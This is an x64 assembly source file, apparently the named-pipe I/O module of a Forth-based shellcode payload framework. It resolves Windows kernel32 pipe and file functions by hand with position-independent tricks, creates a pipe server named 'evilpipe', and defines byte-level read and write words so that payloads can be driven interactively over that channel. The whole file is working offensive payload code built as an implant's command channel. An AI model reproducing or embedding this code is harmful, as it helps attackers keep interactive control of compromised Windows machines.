%ifndef NAMED_PIPE
	%define NAMED_PIPE "\\.\pipe\evilpipe"
%endif

%ifndef DELAY
	%define DELAY 86400000
%endif

%ifndef PIPEBUFLEN
	%define PIPEBUFLEN 16384
%endif

;;; Put a number on the stack identifying which IO engine this is.  Each IO layer
;;; needs to have its own unique ID.  This allows payloads to make decisions
;;; based on the configured IO.
	
start_def ASM, engine, "engine"
	pushthing 6
end_def engine

;;; This function will be called before any IO is performed.  This can be used to
;;; set up streams, initialize IO layer global variables, make network connections,
;;; etc.
	
start_def ASM, initio, "initio"
	mov rbp, rsp
	and rsp, -16 		; align stack
	sub rsp, 0x50
	
	call .b
.a:     db "CreateNamedPipeA", 0
.a1:	db "ConnectNamedPipe", 0
.a2:	db "WriteFile", 0
.a3:	db "ReadFile", 0
.a4:	db "PeekNamedPipe", 0
.b:     pop rbx

	mov rax, KERNEL32_BASE
	mov rsi, W32_GetProcAddress
	mov rdi, rax
	GetProcAddress  0, W32_CREATEPIPE
	GetProcAddress  code_initio.a1 - code_initio.a, W32_CONNECTPIPE
	GetProcAddress  code_initio.a2 - code_initio.a, W32_WRITEFILE
	GetProcAddress  code_initio.a3 - code_initio.a, W32_READFILE
	GetProcAddress  code_initio.a4 - code_initio.a, W32_PEEKPIPE
	
	call .c
	db NAMED_PIPE, 0
.c:	pop rcx
	mov rdx, 3
	mov r8, 0
	mov r9, 1
	mov QWORD [rsp+0x20], PIPEBUFLEN
	mov QWORD [rsp+0x28], PIPEBUFLEN
	mov QWORD [rsp+0x30], DELAY
	mov QWORD [rsp+0x38], 0
	call W32_CREATEPIPE
	AddGlobal G_HPIPE, rax

	mov rcx, rax
	xor edx, edx
	AddGlobal G_PIPEBUF, rdx
	AddGlobal G_PIPELEN, rdx
	call W32_CONNECTPIPE

	mov rsp, rbp
end_def initio
	
;;; Take a value from the stack and emit it to the output stream as a single byte.

start_def ASM, emit, "emit"
	push rcx
	push rdx
	
	popthing QWORD G_PIPEBUF
	mov rcx, G_HPIPE
	mov rdx, G_PIPEBUF_OFF
	add rdx, r15
	mov r8, 1
	mov r9, G_PIPELEN_OFF
	add r9, r15
	sub rsp, 0x28
	mov QWORD [rsp+0x20], 0
	call W32_WRITEFILE
	add rsp, 0x28
	
	pop rdx
	pop rcx
end_def emit
	
;;; Read a single byte from the input stream and put its value on top of the stkack.
	
start_def ASM, key, "key"
	push rcx
	push rdx
	push rbp

	mov rbp, rsp
	and rsp, -16 		; align stack
	sub rsp, 0x50
	
	mov rcx, G_HPIPE
	mov rdx, G_PIPEBUF_OFF
	add rdx, r15
	mov r8, 1
	mov r9, G_PIPELEN_OFF
	add r9, r15
	mov QWORD [rsp+0x20], 0
	call W32_READFILE
	
	and rax, rax		; simplistic exit if failure
	jz code_bye		; ...

	mov rax, G_PIPEBUF	; get the char we read
	pushthing rax		; put it on the data stack

	mov rsp, rbp

	pop rbp
	pop rdx
	pop rcx
end_def key

start_def ASM, keyq, "key?"
	nop
	nop
	push rbp
	mov rbp, rsp
	and rsp, -16
	sub rsp, 0x50

	xor eax, eax
	mov rcx, G_HPIPE
	mov rdx, rax
	mov r8, rax
	mov r9, rax
	mov [rsp+0x28], rax
	mov rax, G_PIPELEN_OFF
	add rax, r15
	mov [rsp+0x20], rax
	call W32_PEEKPIPE

	pushthing QWORD G_PIPELEN

	mov rsp, rbp
	pop rbp
end_def keyq
	
;;; Given a buffer and length, send multiple bytes to the output stream.  This is
;;; largely provided as a convenience for situations where IO can be optimized
;;; for block communications.

start_def ASM, type, "type"
	popthing rcx
	popthing rsi

.loop:
	pushthing [rsi]
	and rdi, 0xff
	push rcx
	push rsi
	call code_emit
	pop rsi
	pop rcx
	inc rsi
	loop .loop
end_def type

;;; Enable and disable echoing of input to the output stream.  Some IO
;;; layers may prefer to allow this to be configurable.  Leave them empty
;;; if they don't make sense for your IO layer.
	
start_def ASM, echooff, "-echo"
end_def echooff

start_def ASM, echoon, "+echo"
end_def echoon

start_def ASM, setecho, "!echo"
end_def setecho

